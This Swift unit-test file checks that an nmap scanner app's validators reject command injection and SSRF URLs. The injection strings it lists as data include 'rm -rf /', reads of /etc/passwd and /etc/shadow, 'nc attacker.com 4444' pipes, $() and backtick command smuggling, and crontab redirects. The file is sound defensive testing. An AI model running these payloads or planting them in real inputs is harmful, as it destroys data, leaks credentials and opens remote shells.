//
//  CommandInjectionTests.swift
//  NMAPScannerTests
//
//  Tests for command injection prevention across the application.
//  Validates that IP addresses, port ranges, and URLs are properly sanitized
//  before being passed to shell commands (nmap, pfctl, etc.).
//
//  Created by Jordan Koch on 2026-04-21.
//

import XCTest
@testable import NMAPScanner

final class CommandInjectionTests: XCTestCase {

    // MARK: - IP Address Validation (IPValidator)

    func testValidIPv4AddressesAccepted() throws {
        let validIPs = [
            "192.168.1.1",
            "10.0.0.1",
            "172.16.0.1",
            "255.255.255.255",
            "0.0.0.0",
            "1.2.3.4",
        ]
        for ip in validIPs {
            XCTAssertNoThrow(try IPValidator.validateIPAddress(ip), "Expected \(ip) to be accepted as valid")
        }
    }

    func testInvalidIPv4FormatsRejected() throws {
        let invalidIPs = [
            "256.1.1.1",
            "1.2.3.256",
            "-1.0.0.0",
            "1.2.3",
            "1.2.3.4.5",
            "abc.def.ghi.jkl",
            "",
            "   ",
        ]
        for ip in invalidIPs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(ip), "Expected \(ip) to be rejected") { error in
                XCTAssertTrue(error is IPValidationError, "Expected IPValidationError for '\(ip)' but got \(type(of: error))")
            }
        }
    }

    func testSemicolonInjectionInIPAddressRejected() {
        // An attacker could try: "192.168.1.1; rm -rf /"
        let maliciousInputs = [
            "192.168.1.1; rm -rf /",
            "192.168.1.1;ls",
            ";whoami",
            "10.0.0.1; cat /etc/passwd",
        ]
        for input in maliciousInputs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(input),
                "Semicolon injection should be rejected: '\(input)'")
        }
    }

    func testPipeInjectionInIPAddressRejected() {
        let maliciousInputs = [
            "192.168.1.1 | cat /etc/passwd",
            "10.0.0.1|nc attacker.com 4444",
            "|id",
        ]
        for input in maliciousInputs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(input),
                "Pipe injection should be rejected: '\(input)'")
        }
    }

    func testBacktickInjectionInIPAddressRejected() {
        let maliciousInputs = [
            "`whoami`.attacker.com",
            "192.168.1.`id`",
            "`rm -rf /`",
        ]
        for input in maliciousInputs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(input),
                "Backtick injection should be rejected: '\(input)'")
        }
    }

    func testDollarParenInjectionInIPAddressRejected() {
        let maliciousInputs = [
            "$(whoami)",
            "192.168.$(id).1",
            "$(cat /etc/shadow)",
        ]
        for input in maliciousInputs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(input),
                "$() injection should be rejected: '\(input)'")
        }
    }

    func testAmpersandInjectionInIPAddressRejected() {
        let maliciousInputs = [
            "192.168.1.1 && rm -rf /",
            "10.0.0.1 & nc attacker.com 4444",
            "&&id",
        ]
        for input in maliciousInputs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(input),
                "Ampersand injection should be rejected: '\(input)'")
        }
    }

    func testNewlineInjectionInIPAddressRejected() {
        let maliciousInputs = [
            "192.168.1.1\nwhoami",
            "10.0.0.1\r\nid",
        ]
        for input in maliciousInputs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(input),
                "Newline injection should be rejected: '\(input)'")
        }
    }

    func testRedirectInjectionInIPAddressRejected() {
        let maliciousInputs = [
            "192.168.1.1 > /tmp/pwned",
            "10.0.0.1 >> /tmp/pwned",
            "< /etc/passwd",
        ]
        for input in maliciousInputs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(input),
                "Redirect injection should be rejected: '\(input)'")
        }
    }

    func testEmptyInputRejected() {
        XCTAssertThrowsError(try IPValidator.validateIPAddress("")) { error in
            guard let ipError = error as? IPValidationError else {
                XCTFail("Expected IPValidationError"); return
            }
            XCTAssertEqual(ipError, .emptyInput)
        }
    }

    func testWhitespaceOnlyInputRejected() {
        XCTAssertThrowsError(try IPValidator.validateIPAddress("   "))
        XCTAssertThrowsError(try IPValidator.validateIPAddress("\t"))
        XCTAssertThrowsError(try IPValidator.validateIPAddress("\n"))
    }

    func testLoopbackAddressRejectedWhenNotAllowed() {
        XCTAssertThrowsError(try IPValidator.validateIPAddress("127.0.0.1", allowLoopback: false)) { error in
            guard let ipError = error as? IPValidationError else {
                XCTFail("Expected IPValidationError"); return
            }
            XCTAssertEqual(ipError, .loopbackNotAllowed)
        }
        // 127.x.x.x range
        XCTAssertThrowsError(try IPValidator.validateIPAddress("127.1.2.3", allowLoopback: false))
    }

    func testLoopbackAddressAcceptedWhenAllowed() {
        XCTAssertNoThrow(try IPValidator.validateIPAddress("127.0.0.1", allowLoopback: true))
    }

    func testMulticastAddressRejected() {
        let multicastIPs = ["224.0.0.1", "239.255.255.255", "230.1.2.3"]
        for ip in multicastIPs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(ip),
                "Multicast address should be rejected: \(ip)") { error in
                guard let ipError = error as? IPValidationError else {
                    XCTFail("Expected IPValidationError"); return
                }
                XCTAssertEqual(ipError, .multicastNotAllowed)
            }
        }
    }

    func testPrivateAddressRejectedWhenNotAllowed() {
        let privateIPs = ["10.0.0.1", "172.16.0.1", "172.31.255.255", "192.168.0.1"]
        for ip in privateIPs {
            XCTAssertThrowsError(try IPValidator.validateIPAddress(ip, allowPrivate: false),
                "Private address should be rejected when not allowed: \(ip)") { error in
                guard let ipError = error as? IPValidationError else {
                    XCTFail("Expected IPValidationError"); return
                }
                XCTAssertEqual(ipError, .privateAddressNotAllowed)
            }
        }
    }

    func testPrivateAddressAcceptedByDefault() {
        XCTAssertNoThrow(try IPValidator.validateIPAddress("10.0.0.1"))
        XCTAssertNoThrow(try IPValidator.validateIPAddress("192.168.1.1"))
        XCTAssertNoThrow(try IPValidator.validateIPAddress("172.16.0.1"))
    }

    func testIsValidIPHelperMethod() {
        XCTAssertTrue(IPValidator.isValidIP("192.168.1.1"))
        XCTAssertTrue(IPValidator.isValidIP("10.0.0.1"))
        XCTAssertFalse(IPValidator.isValidIP(""))
        XCTAssertFalse(IPValidator.isValidIP("abc"))
        XCTAssertFalse(IPValidator.isValidIP("999.999.999.999"))
        XCTAssertFalse(IPValidator.isValidIP("192.168.1.1;whoami"))
    }

    // MARK: - Subnet Validation

    func testValidSubnetsAccepted() {
        XCTAssertNoThrow(try IPValidator.validateSubnet("192.168.1"))
        XCTAssertNoThrow(try IPValidator.validateSubnet("10.0.0"))
    }

    func testTooSmallSubnetRejected() {
        // /8 and /16 subnets are too large to scan
        XCTAssertThrowsError(try IPValidator.validateSubnet("10")) { error in
            guard let ipError = error as? IPValidationError else {
                XCTFail("Expected IPValidationError"); return
            }
            XCTAssertEqual(ipError, .subnetTooLarge)
        }
        XCTAssertThrowsError(try IPValidator.validateSubnet("192.168"))
    }

    func testSubnetWithShellMetacharsRejected() {
        XCTAssertThrowsError(try IPValidator.validateSubnet("192.168.1;id"))
        XCTAssertThrowsError(try IPValidator.validateSubnet("192.168.$(whoami)"))
        XCTAssertThrowsError(try IPValidator.validateSubnet("192.168.1|cat"))
    }

    // MARK: - URL Validation (URLValidator)

    func testValidControllerURLsAccepted() throws {
        let result1 = try URLValidator.validateControllerURL("https://192.168.1.100:8443")
        XCTAssertTrue(result1.hasPrefix("https://"))

        let result2 = try URLValidator.validateControllerURL("192.168.1.100")
        XCTAssertEqual(result2, "https://192.168.1.100")

        let result3 = try URLValidator.validateControllerURL("http://unifi.local:8080")
        XCTAssertEqual(result3, "http://unifi.local:8080")
    }

    func testEmptyURLRejected() {
        XCTAssertThrowsError(try URLValidator.validateControllerURL("")) { error in
            guard let urlError = error as? URLValidationError else {
                XCTFail("Expected URLValidationError"); return
            }
            XCTAssertEqual(urlError, .emptyInput)
        }
    }

    func testBlockedHostsRejected() {
        // AWS metadata service
        XCTAssertThrowsError(try URLValidator.validateControllerURL("http://169.254.169.254")) { error in
            guard let urlError = error as? URLValidationError else {
                XCTFail("Expected URLValidationError"); return
            }
            XCTAssertEqual(urlError, .blockedHost)
        }

        // Localhost
        XCTAssertThrowsError(try URLValidator.validateControllerURL("http://127.0.0.1"))
        XCTAssertThrowsError(try URLValidator.validateControllerURL("http://localhost"))
        XCTAssertThrowsError(try URLValidator.validateControllerURL("http://0.0.0.0"))

        // GCP metadata
        XCTAssertThrowsError(try URLValidator.validateControllerURL("http://metadata.google.internal"))
    }

    func testSSRFMetadataServiceBlocked() {
        // SSRF attacks targeting cloud metadata endpoints
        let ssrfTargets = [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/api/token",
            "http://metadata.google.internal/computeMetadata/v1/",
        ]
        for target in ssrfTargets {
            XCTAssertThrowsError(try URLValidator.validateControllerURL(target),
                "SSRF target should be blocked: \(target)")
        }
    }

    // MARK: - Nova API IP Validation (Regex-based)

    /// Tests the regex pattern used in NovaAPIServer's /api/scan/start endpoint
    /// to validate IP/CIDR input before passing to nmap subprocess.
    func testNovaAPIScanIPRegexAcceptsValidInputs() {
        let ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(\/\d{1,2})?$/

        let validInputs = [
            "192.168.1.1",
            "10.0.0.0/24",
            "172.16.0.0/12",
            "0.0.0.0/0",
            "255.255.255.255",
            "192.168.1.0/32",
        ]
        for input in validInputs {
            XCTAssertNotNil(input.wholeMatch(of: ipRegex),
                "Expected IP regex to accept: '\(input)'")
        }
    }

    func testNovaAPIScanIPRegexRejectsInjectionPayloads() {
        let ipRegex = /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(\/\d{1,2})?$/

        let injectionPayloads = [
            "192.168.1.1; rm -rf /",
            "192.168.1.1 && whoami",
            "192.168.1.1 | nc attacker.com 4444",
            "`whoami`",
            "$(id)",
            "192.168.1.1\nwhoami",
            "-sV --script exploit 192.168.1.1",
            "192.168.1.1 -oN /tmp/output",
            "--script=http-shellshock 192.168.1.1",
            "192.168.1.1' OR '1'='1",
            "192.168.1.1\" OR \"1\"=\"1",
            "192.168.1.1; touch /tmp/pwned",
            "192.168.1.1 > /etc/crontab",
            "abc.def.ghi.jkl",
            "",
            " ",
            "../../../etc/passwd",
            "192.168.1.1#comment",
        ]
        for payload in injectionPayloads {
            XCTAssertNil(payload.wholeMatch(of: ipRegex),
                "IP regex should reject injection payload: '\(payload)'")
        }
    }

    func testNovaAPIOctetValidation() {
        // The API also validates each octet is 0-255 after the regex check
        let invalidOctetIPs = [
            "256.1.1.1",
            "1.999.1.1",
            "1.1.300.1",
            "1.1.1.256",
        ]
        for ip in invalidOctetIPs {
            let octets = ip.components(separatedBy: "/").first!.components(separatedBy: ".")
            let validOctets = octets.allSatisfy { if let n = Int($0) { return n >= 0 && n <= 255 } else { return false } }
            XCTAssertFalse(validOctets, "Octet validation should reject: '\(ip)'")
        }

        let validOctetIPs = ["192.168.1.1", "0.0.0.0", "255.255.255.255"]
        for ip in validOctetIPs {
            let octets = ip.components(separatedBy: "/").first!.components(separatedBy: ".")
            let validOctets = octets.allSatisfy { if let n = Int($0) { return n >= 0 && n <= 255 } else { return false } }
            XCTAssertTrue(validOctets, "Octet validation should accept: '\(ip)'")
        }
    }

    func testNovaAPICIDRRangeValidation() {
        // CIDR prefix must be 0-32
        let invalidCIDRs = ["192.168.1.0/33", "10.0.0.0/64", "172.16.0.0/99"]
        for input in invalidCIDRs {
            if let cidrPart = input.components(separatedBy: "/").last,
               input.contains("/"),
               let cidr = Int(cidrPart) {
                XCTAssertTrue(cidr < 0 || cidr > 32, "CIDR validation should reject: '\(input)'")
            }
        }

        let validCIDRs = ["192.168.1.0/24", "10.0.0.0/8", "172.16.0.0/0", "192.168.1.0/32"]
        for input in validCIDRs {
            if let cidrPart = input.components(separatedBy: "/").last,
               input.contains("/"),
               let cidr = Int(cidrPart) {
                XCTAssertTrue(cidr >= 0 && cidr <= 32, "CIDR validation should accept: '\(input)'")
            }
        }
    }

    // MARK: - Secure Logger Masking

    func testSecureLoggerMasksPasswords() {
        // The SecureLogger.maskSensitiveData method is private, but we can test
        // the visible behavior by ensuring patterns are masked in output.
        // Since maskSensitiveData is private, we test the patterns it uses.
        let passwordPattern = #""password"\s*:\s*"[^"]*""#
        let regex = try! NSRegularExpression(pattern: passwordPattern, options: [.caseInsensitive])

        let testInput = #"{"password": "SuperSecret123"}"#
        let range = NSRange(testInput.startIndex..., in: testInput)
        let matches = regex.numberOfMatches(in: testInput, range: range)
        XCTAssertGreaterThan(matches, 0, "Password pattern should be detected")
    }

    func testSecureLoggerMasksBearerTokens() {
        let bearerPattern = #"Bearer\s+[A-Za-z0-9+/=]+"#
        let regex = try! NSRegularExpression(pattern: bearerPattern, options: [.caseInsensitive])

        let testInput = "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9"
        let range = NSRange(testInput.startIndex..., in: testInput)
        let matches = regex.numberOfMatches(in: testInput, range: range)
        XCTAssertGreaterThan(matches, 0, "Bearer token pattern should be detected")
    }

    // MARK: - Certificate Fingerprint Formatting

    func testCertificateFingerprintFormatting() {
        let rawFingerprint = "aabbccdd11223344"
        let formatted = CertificateFingerprint.formatForDisplay(rawFingerprint)
        XCTAssertEqual(formatted, "AA:BB:CC:DD:11:22:33:44")
    }

    func testEmptyFingerprintFormatting() {
        let formatted = CertificateFingerprint.formatForDisplay("")
        XCTAssertEqual(formatted, "")
    }
}
